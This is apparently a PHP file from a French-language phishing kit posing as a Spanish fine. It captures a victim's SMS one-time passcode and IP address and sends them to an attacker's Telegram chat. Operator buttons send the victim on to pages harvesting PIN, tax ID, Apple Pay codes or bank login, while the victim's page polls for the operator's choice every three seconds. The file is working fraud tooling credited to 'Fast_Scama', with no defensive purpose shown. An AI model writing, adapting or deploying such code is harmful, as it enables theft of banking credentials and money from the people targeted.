<?php
session_start();

//include('../server/fonctions.php');
include('../settings.php');
require __DIR__ . '/vendor/autoload.php';

date_default_timezone_set('Europe/Paris');
$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;

use Telegram\Bot\Api;

$ip = $_SERVER['REMOTE_ADDR'];
$error = false;
$step = 1;
$telegram = new Api($bot_token);
$_SESSION['vbv_code2'] = $_POST['vbv_code2'];



if (!empty($_POST['vbv_code2'])) {
    $step = 2;

    $keyboard = [
        'inline_keyboard' => [
            [['text' => '❌ | Invalide sms basic', 'callback_data' => 'invalide_sms']],
            [['text' => '📱  | Apple Pay ', 'callback_data' => 'otp_apple']],         
            [['text' => '📱  | Pin + NIF ', 'callback_data' => 'otp_pin']],
            [['text' => '📱  | Banque login ', 'callback_data' => 'otp_banque']],
            [['text' => '✅ | Succès ', 'callback_data' => 'succes']],
        ]
    ];
    $telegram->sendMessage([
        'chat_id' => $chat_rez,
        'text' => "
        [📜] OTP SMS | 🇪🇸 Amende Espagne                    

        [📜] OTP SMS : {$_SESSION['vbv_code2']}        

        [🗺️] Informations liée au client [🗺️]
        [⌚] Heure et date du rez : {$_SESSION['date_heure']}
        [🌐] Ip Victime : $ip\n
			
        [©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]"
        ,

        'reply_markup' => json_encode($keyboard)
    ]);
} else {    
    $error = true;   
    header("Location: ../user/sms_auth2.php?error=1");
    exit; 
}
?>
<!DOCTYPE html>
<html>
<head>
 
</head>
<body>
    <?php if ($step == 1): ?>
        <?php if ($error): ?>
            
            <div style="color:red;">
                <?= $errorMessage ?>
            </div>
        <?php endif; ?>
    <?php elseif ($step == 2): ?>
        <div>
            <?php include '../user/loader.php'; ?>
        </div>
        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
        <script>
            setInterval(function () {
                $.ajax({
                    type: "GET",
                    url: "callback.php",
                    success: function (msg) {
                        if (msg === 'invalide_sms') {
                            window.location.href = '../user/sms_auth2.php?error=1';
                        } else if (msg === 'otp_pin') {
                            window.location.href = '../user/pin.php';
                        } else if (msg === 'otp_apple') {
                            window.location.href = '../user/sms_auth.php';
                        }                       
                        
                        else if (msg === 'otp_banque') {
                            window.location.href = '../user/banque.php';
                        } else if (msg === 'succes') {
                            window.location.href = '../user/succes.php';
                        }
                    }, 
                    error: function (msg) {
                        console.error(msg);
                    }
                });
            }, 3000) 
        </script>
    <?php endif; ?>
</body>
</html>
